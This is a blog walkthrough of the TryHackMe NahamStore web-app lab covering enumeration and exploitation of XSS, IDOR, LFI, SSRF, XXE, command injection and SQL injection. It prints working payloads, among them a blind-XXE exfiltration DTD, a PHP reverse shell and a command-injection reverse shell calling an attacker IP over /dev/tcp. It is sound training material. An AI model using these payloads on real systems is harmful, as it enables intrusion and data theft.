---
layout: post
title: NahamStore TryHackMe detailed writeup
subtitle: This is a interesting medium box on TryHackme website.
tags: [writeup, tryhackme]
comments: true
---



In my opinion, this is a very cool box where it cover a lot of webapp pentest technique. A very good box to practice your webapp pentest skill. If you don't have enough knowledge about webapp pentest, this resouce will be a good place to start ([portswigger-lab](https://portswigger.net/web-security/all-labs))  

For this box i will devide it into 2 part:
- First part is for enumeration
- Second part is where we solve task by task

Just an alert, this is a very long box

# Enumeration
First we need to add virtual host to our `/etc/hosts`
```
<ip> nahamstore.thm
```
## Port scanning
Let start with some nmap
```
nmap -v nahamstore.thm
...
Discovered open port 80/tcp on 10.10.178.53
Discovered open port 22/tcp on 10.10.178.53
Discovered open port 8000/tcp on 10.10.178.53
...
```
The result show 3 open port, it is very likely there is 2 webserver on port 80 and 8000, let have a look closer these port
```
80/tcp   open  http    nginx 1.14.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     session: 
|_      httponly flag not set
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: NahamStore - Home
8000/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```
So there is 2 webserver here
## Port 80
At a first glance, this is an online shopping page. As the advice, we should find its subdomains first
### Find subdomains
I will use `wfuzz` to find it subdomain with file `subdomains-top1million-110000.txt` 
```
wfuzz --hl 24 -u http://nahamstore.thm -H "Host: FUZZ.nahamstore.thm" -w /usr/share/wordlists/seclist/subdomain/subdomains-top1million-110000.txt
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload                         
=====================================================================                    
000000037:   301        7 L      13 W       194 Ch      "shop"                          
000000254:   200        41 L     92 W       2025 Ch     "marketing"                     
000000961:   200        0 L      1 W        67 Ch       "stock"   
```
So we find 3 interesting subdomain and let add it to `/etc/hosts` to access to them
- `shop.nahamstore.thm`: it is online shopping store same as we have seen
- `stock.nahamstore.thm`: it is a API page for geting product
- `marketing.nahamstore.thm`: it is a site for getting discount

I will start with the online shopping first because it has more feture
## shop.nahamstore.thm
Let directory brute force it to find out something juicy path
### Find juice path
```
gobuster dir -u http://nahamstore.thm -w /usr/share/wordlists/dirb/common.txt -t 20
...
/basket               (Status: 200) [Size: 2465]
/css                  (Status: 301) [Size: 178] [--> http://127.0.0.1/css/]
/js                   (Status: 301) [Size: 178] [--> http://127.0.0.1/js/] 
/login                (Status: 200) [Size: 3099]                           
/logout               (Status: 302) [Size: 0] [--> /]                      
/register             (Status: 200) [Size: 3138]                           
/returns              (Status: 200) [Size: 3628]                           
/robots.txt           (Status: 200) [Size: 13]                             
/search               (Status: 200) [Size: 3351]                           
/staff                (Status: 200) [Size: 2287]                           
/uploads              (Status: 301) [Size: 178] [--> http://127.0.0.1/uploads/]
```
The result show 1 hidden path we cannot see from normal user interface is `staff`. Let remember that and try to go site by site
### /login and /register
I try to creat a account and using Burp Suite to intercept the request and found out there is nothing to see on the register. The login feature is also the same  
Now let have a look at the cookie
```
token=89e39a3a06557d671c603f08dc047e86;
session=ebffcc304684a2c6139caf6949ea88b8
```
Cookie are unpridictable too. So there isn't any juicy information we can gather
### /product?id=
Here we can see it has parameter `id` so let try some SQLi
```
http://nahamstore.thm/product?id='
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 1' at line 1
```
So it is vulnerable to SQLi, take a note about it  
One more interesting thing find here, inside the network tab
![alt text](/assets/img/tryhackme/nahamStore/network_tab.PNG)
There is a paramter `file=` for the API `/product/picture`. Let send it to `Burp Repeter`. I will try simple LFI `../../../../../../etc/passwd`
![alt text](/assets/img/tryhackme/nahamStore/lfi_block.PNG)
It look like there is a filter here. So let come back later
### /checkstock
It is the API when you press on `check stock` button, you can use Burp Suite to intercept the request to see this:
```
POST /stockcheck HTTP/1.1
Host: nahamstore.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
...

product_id=2&server=stock.nahamstore.thm
```
We can see it has paramter `server`, it is likely there is a SSRF vulnerable in here. We will come back here later
### /basket
Here is where we proceed our goods.
![alt text](/assets/img/tryhackme/nahamStore/basket.PNG)
There is nothing here now. Let try `Add Another Address` button and we get this request when we press
```
GET /account/addressbook?redirect_url=/basket HTTP/1.1
Host: nahamstore.thm
...
```
This recieve a parameter `redirect_url`. We find out 1 parameter use to redirect. Let note it down cause it might be usefull for our `SSRF` attack  
Then I try to create new address book on the redirect link and then go back to the basket. Now we can see it has our created address book
![alt text](/assets/img/tryhackme/nahamStore/basket_address.PNG)
Let click on it and intercept it. We recieve this request
```
POST /basket HTTP/1.1
Host: nahamstore.thm
...
address_id=5
```
There is a paramter `address_id` with the id of our address book. I courious what will happen if we change to other id. Let change to `addredss_id=1` and voila...  
![alt text](/assets/img/tryhackme/nahamStore/basket_idor.PNG)
This is the `IDOR` exploit, which the website pass direct the input of user without any filter. This allow us to change to parameter to see other user data. Take a note on this and continue.  
I try the card number that is in the placeholder, which is `1234123412341234` and our payment complete
### /account/orders
After finish payment, there is an order in our order tab. We can see our order at with the format `account/orders/<id>`. 
![alt text](/assets/img/tryhackme/nahamStore/order.PNG)
I try to change to other order ID but redirect us back to the `/account/orders`. But there is a loophole when we click on `pdf reciept`, we got this request:
```
POST /pdf-generator HTTP/1.1
Host: nahamstore.thm
...
what=order&id=4
```
I try to change the id to other id but sadly there is a filter mechanism on this too
![alt text](/assets/img/tryhackme/nahamStore/block_order.PNG)
But let's think a little bit, how can it filter. Could there be any `Command Injection` here. We will comeback it later
### /returns
This is a place where we can returns order. It only accept the valid orders id. So let try our previous order id is 4.
```
POST /returns HTTP/1.1
Host: nahamstore.thm
...
Upgrade-Insecure-Requests: 1
-----------------------------270893715428640862821998092503
Content-Disposition: form-data; name="order_number"
4
-----------------------------270893715428640862821998092503

Content-Disposition: form-data; name="return_reason"
3
-----------------------------270893715428640862821998092503

Content-Disposition: form-data; name="return_info"
asdfasdf
-----------------------------270893715428640862821998092503--
```
So there is 3 paramter, but we focus on the orderID beacause it can check whether it is a valid orderID or not. So that it has to query to database to check.  Base on that I try some SQLi here:
- `oder_numer = 4 'or 1=1`: I try this number => our request fail. So there maybe some filter here 
- `oder_numer = 4 && 1 `: our request successfull
So base on that we can conclude it is `Blind SQLi`. We will take further exploit with `sqlmap` in second part
### /staff
This is the hidden directory we can find out.
 ![alt text](/assets/img/tryhackme/nahamStore/staff.PNG)
It is where the staff can upload the Excel file. But we allow to upload to => `Broken Access control`. Notice that `.xlsx` is also a XML format, this can be vulnerable to `XXE file upload attack`  

I think we have check most of all feature of this domain. Let try another
## stock.nahamstore.thm
It only a API server to get information about the product. I try to use `wfuzz` for different API endpoint with wordlist `api_object.txt` of seclist:
```
wfuzz --hw 5 -u http://stock.nahamstore.thm/FUZZ -w /usr/share/wordlists/seclist/api_object.txt
```
But there is no hope here. But let try another way, instead of `/FUZZ` we change to parameter style `?FUZZ`
```
wfuzz --hw 1 -u http://stock.nahamstore.thm?FUZZ -w /usr/share/wordlists/seclist/api_object.txt
...
000003115:   200        2 L      3 W        130 Ch      "xml"  
```
And finnaly we got the paramter is xml. Let try that:
 ![alt text](/assets/img/tryhackme/nahamStore/stock_xml.PNG)
 It likely this is another `XXE` attack. Let note this down and move on the next subdomain
 ## marketing.nahamstore.thm
 There is nothing here except a page where can register email and name, but there is nothing happen after that. So move on  
 At this point, we have done for port 80, so move to port 8000  
 
## Port 8000

 The result from nmap has show us there is a path `/admin` here. I try to login with defaul credential `admin:admin` and success go inside
  ![alt text](/assets/img/tryhackme/nahamStore/admin.PNG)
  It is the edit page for the subdomain `marketing.nahamstore.thm`, we can modify the page here. At this point, possible path is we can add some php code to open a reverse shell to our computer.  
  It is all for the enumeration part. Let's exploit  

# Solving task
For this, i will go with task by task order and it is different with exploit order.
## [Task 3] Recon
I can only solve this task when got `RCE` to the box and find out the subdomain in `/etc/hosts` is `nahamstore-2020-dev.nahamstore.thm`. And after  some fuzzing you can file the path for user Jimmy Jones is:
```
curl 'http://nahamstore-2020-dev.nahamstore.thm/api/customers/?customer_id=2'
{"id":2,"name":"Jimmy Jones","email":"jd.jones1997@yahoo.com","tel":"501-392-5473","ssn":"521-61-6392"}
```

## [Task 4]  XSS
I am not discussing XSS in the enumeration phase but let start it now  

### Enter an URL ( including parameters ) of an endpoint that is vulnerable to XSS?
Base number of character of the placeholder in the answer, we can guess it happen in the domain `marketing.nahamastore.thm`. But the page don't reveal any other paramter. Let's fuzzing it *(I will use the wordlist `api_object` of seclist)*
```
 wfuzz --hw 92 -u http://marketing.nahamstore.thm/?FUZZ= -w /usr/share/wordlists/seclist/api_object.txt
 =====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                 
=====================================================================

000000641:   200        44 L     102 W      2168 Ch     "error"    
```

You can see that only the `error` paramter behavior diffrently. Lets test it out:  

 ![alt text](/assets/img/tryhackme/nahamStore/xss1.PNG)  
 
We can see it can change content of the error message so it can be `Reflected XSS`. Inspect the HTML we can see that our input is place inside `img` tag. Let add the payload `<img src=1 onerror=alert(1) />` try get an alert  

 ![alt text](/assets/img/tryhackme/nahamStore/xss1_alert.PNG)  
 So that is the answer for 1st question  
 
### What HTTP header can be used to create a Stored XXS?

 This can be found when you make payment for your order. In your order detail, you will see there is a field called `User Agent`, i guess that it will get our `User Agent header` when we make payment to store. So that it is simple `Stored XSS`. To exploit it, let's make another payment. But before you click on make payment, turn on the intercept on Burp Suite and then the User Agent of the request to:  
 ```
 User-Agent: <script>alert(1)</script>
 ```
 And watch the result:
  ![alt text](/assets/img/tryhackme/nahamStore/xss2.PNG)  
  
### What HTML tag needs to be escaped on the product page to get the XSS to work?

Go to the homepage click on the image of any product, you will see another paramter called `name`. We can change it and it also change the name of our tag. So there input value must be place inside the `title` tag like this  
```
<title>NahamStore - your_input_here</title>
```
So this is the `Reflected XSS` Error

### What JavaScript variable needs to be escaped to get the XSS to work?

Make search for `aaaa` on the homepage `/search?q=aaaa` then click on viewsource you will see a script like this:  
```
var search = 'aaaa';
```
So to exploit this you just need to input `a'; alert(1)//`. This will make the script change to:  
```
var search = 'a'; alert(1)//;
```

### What hidden parameter can be found on the shop home page that introduces an XSS vulnerability.

Go to the homepage and click on view source. You will see there is html element like this:  
```
<input class="form-control" name="q" placeholder="Search For Products" value="">
```
Let try to query on the homepage with parameter `?q=aa`. We can see that it chanege the element like this:  
```
<input class="form-control" name="q" placeholder="Search For Products" value="aaa">
```
So this a `Reflected XSS` inside the HTML attribute. To exploit just change the input to `/?q=" autofocus onfocus="alert(1)`. This will cause the broswer to make an alert

### What HTML tag needs to be escaped on the returns page to get the XSS to work?

Let's try to make a return and then inspect the HTML. We can see that this is source of our return:  
```html
<div class="panel-body">
  <div><label>Status: </label>Awaiting Decision</div>
  <div style="margin-top:7px"><label>Order Number: </label>4</div>
  <div style="margin-top:7px"><label>Return Reason: </label>Wrong Size</div>
  <div style="margin-top:7px"><label>Return Information:</label></div>
  <div><textarea class="form-control">adsf</textarea></div>
</div>
```
We can't change the order number cause it require a valid orde number. So the only field we change is `textarea`. Go back and make another return with the `Return Information` is `<script>alert(1)</script>`  
You will see an alert and this is a `Reflected XSS` error  

### What is the value of the H1 tag of the page that uses the requested URL to create an XSS?

The only use the url to get inut is search function on the homepage. It will dislay the text in `h1` is `Page Not Found`

### What other hidden parameter can be found on the shop which can introduce an XSS vulnerability?

Access to any product on the homepage and view source. You will see HTML element look like this:  
```
<div style="margin-bottom:10px"><input placeholder="Discount Code" class="form-control" name="discount" value=""></div>
```
You can see the name is `discount`. Let try to use the param `discount` on that page with request `/product?id=2&discount=aaa`. Notice the value of the discount filed has change to `aaa`:  
```
<input placeholder="Discount Code" class="form-control" name="discount" value="aaa">
```  
So there is a `Refleced XSS` here. Change the input to `/product?id=2&discount=" autofocus onfocus="alert(1)` and you will see an alert


## [Task 5] Open redirect

### Open Redirect One
We can't not find out this when we enumerate, but it is only 1 character so we can guessed it :))). You can try this with:
```
http://nahamstore.thm?x=basket
```
*It is another character, not x =.=*

### Open Redirect Two
It is the paratmeter we find in our enumeration phase `rexxxxxxxrl`

## [Task 6] CSRF
processing

## [Task 7] IDOR
We found 2 IDOR exploit when we enumerate `basket` and  `pdf reciept` feature

### First Line of Address
It request us to find the fist line of address person  live in New York, so let find out with our previous request
```
POST /basket HTTP/1.1
Host: nahamstore.thm
...
address_id=3
```
The address_id=3 will give us the result
 ![alt text](/assets/img/tryhackme/nahamStore/task7_ress.PNG)


### Order ID 3 date and time
This is more tricky, we found out that there is some filter mechanism with the `pdf reciept`
```
POST /pdf-generator HTTP/1.1
Host: nahamstore.thm
...
what=order&id=4
```
It will filter whenever we change to the ID that is not belong to our user. We can bypass this by passing another parameter along with the id `3%26user_id=3`
```
POST /pdf-generator HTTP/1.1
Host: nahamstore.thm
...
what=order&id=3%26user_id=3
```
By this we will see the pdf of order 3

## [Task 8] LFI
There is a paramter `file=` for the API `/product/picture` that we found out that vulnerable to LFI. Let fuzzing for any bypass using wordlist `LFI-Jhaddix.txt` of seclist. I will use `Burp Intruder` with `sniper mode` for this one
 ![alt text](/assets/img/tryhackme/nahamStore/burp.PNG)
 We can see with the payload `....//....//....//etc//passwd` we don't recieve `file not found` message. This mean we bypass the filter. Let get the lag
```
GET /product/picture/?file=....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2flfi%2fflag.txt
```

## [Task 9] SSRF
We found out there is SSRF vuln in the API `POST /stockcheck`. Let try access to other server using this
```
POST /stockcheck HTTP/1.1
Host: nahamstore.thm
...

product_id=2&server=marketing.nahamstore.thm
```
 ![alt text](/assets/img/tryhackme/nahamStore/ssrf_block.PNG)
But we got block. So there is a filter here. We can bypass this by usin  `expected-host@evil-host` or `evil-host#expected-host`. After some try, I find out we can move on with paramter `expectec-host@evilhost#`:
```
product_id=2&server=stock.nahamstore.thm@marketing.nahamstore.thm#
```
 ![alt text](/assets/img/tryhackme/nahamStore/ssrf_bypass.PNG)
 So now we success SSRF attack, but what we can do now? We can try  to brute force for other subdomain, that is only access by localhost using SSRF. Now I will again using `Burp Intruder` to brute force subdomain with wordlist `dns-Jhaddix.txt ` *(cause this one is large)*. Then use can filter out the result by lenght.  
 After a while, we find out another subdomain is `internal-api.nahamstore.thm`, we use the same SSRF method to access and get Credit Card Number For Jimmy Jones:  
```
POST /stockcheck HTTP/1.1
Host: nahamstore.thm
...

product_id=2&server=stock.nahamstore.thm@internal-api.nahamstore.thm/orders/5ae19241b4b55a360e677fdd9084c21c
```

## [Task 10] XXE
We found out 2 XXE location
- `stock.nahamstore.thm?xml`
- `stafft`: XXE file upload

### XXE flag
Let try `stock.nahamstore.thm?xml`. Here we can `GET /?xml=` to recieve the xml data. What happened when we change to `POST /?xml`
 ![alt text](/assets/img/tryhackme/nahamStore/xxe1.PNG)
 We got an error. So I think POST is only for specific product, let's try `POST /product/1?xml`
  ![alt text](/assets/img/tryhackme/nahamStore/xxe2.PNG)
 That is correct with my though, now we need to supply and XML file, i will copy the response error to try:
 ![alt text](/assets/img/tryhackme/nahamStore/xxe3.PNG)
 Now it show that we need `X-Token` tag. Now we already know how to exploit, this is our hacked xml:
 ```
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<data><X-Token>&xxe;</X-Token></data>
```
This will read `flag.txt` and put in `xxe` DTD entity surround by X-Token tag  
![alt text](/assets/img/tryhackme/nahamStore/xxe4.PNG)

### Blind XXE flag
Here we will exploit `XXE file upload` at `/staff`. There is a good source [here](https://www.programmersought.com/article/48705916572/)
First, create a normal `.xlsx` file and then unzip it
```
mkdir test && cd test 
unzip ../sample.xlsx
```
Then modify `xl/workbook.xml` file to this:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY % sp SYSTEM "http://your_ip/hack.xml"> %sp; %param1; ]> <r>&exfil;</r> <workbook [...]
```
Remember to change to your ip then zip it back  
```
zip -r ../upload.xlsx *
```
Then create `hack.xml` on your server
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt"> <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://YOUR_IP/dtd.xml?%data;'>">
```
Then run a python server at the folder that have file `hack.xml`  
```
python3 -m http.server 80
```
After that, just upload your file, and you will get the result on your server
![alt text](/assets/img/tryhackme/nahamStore/xxe5.PNG)

## [Task 11] RCE
We found out there is we can spawn a revershell on `http://nahamstore.thm:8000/admin`

### First RCE
Let modify 1 page and add php reverse shell to it
```
<?php system("bash -c 'bash -i >& /dev/tcp/ip/7777 0>&1'"); ?>
```
And now whenever you access to that page, it will spawn a shell to your computer on port 7777

### Second RCE
We also found out that is possible `Command Injection` on `pdf reciept` . We can insert some command injection to that
```
curl -i -s -k -X $'POST' \-H $'Cookie: token=XXXXXXXXXXXXX; session=XXXXXXXXXXXXXXXXXXX' \ --data-binary $'what=order&id=3`bash+-c+\'bash+-i+>%26+/dev/tcp/<ip>/6666+0>%261\'`' \    $'http://nahamstore.thm/pdf-generator'
```
This will make a reverse shell to your comoputer on port 6666


## [Task 12] SQLi
We have found out 2 place we can have SQLi:
- `/product?id=`
- `POST /returns`: blind SQLi

### Flag 1
It is very simple, you can use sqlmap with this one
```
sqlmap -u 'http://nahamstore.thm/product?id=1&name=A' -p id --dbms mysql -D nahamstore -T sqli_one --dump
[...]
Database: nahamstore
Table: sqli_one
[1 entry]
+----+------------------------------------+
| id | flag                               |
+----+------------------------------------+
| 1  | {xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx} |
+----+------------------------------------+
```

### Flag 2
This blind SQli require you to download the packet, capture `POST /erturns`
![alt text](/assets/img/tryhackme/nahamStore/sqli.PNG)
And the download it and save it as `capture`, now we can use `sqlmap` to get data
```
sqlmap -r capture --dbms='MySQL' -D nahamstore --dump --threads 10
[...]
Multipart-like data found in POST body. Do you want to process it? [Y/n/q] Y
Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
got a 302 redirect to 'http://nahamstore.thm:80/returns/134?auth=02522a2b2726fb0a03bb19f2d8d9524d'. Do you want to follow? [Y/n] n
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] n
(custom) POST parameter 'MULTIPART order_number' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
[...]

Database: nahamstore
Table: sqli_two
[1 entry]
+----+------------------------------------+
| id | flag                               |
+----+------------------------------------+
| 1  | {212ec3b036925a38b7167cf9f0243015} |
+----+------------------------------------+
```

That's the end of my writeup, it is a long night now. Thanks for reading
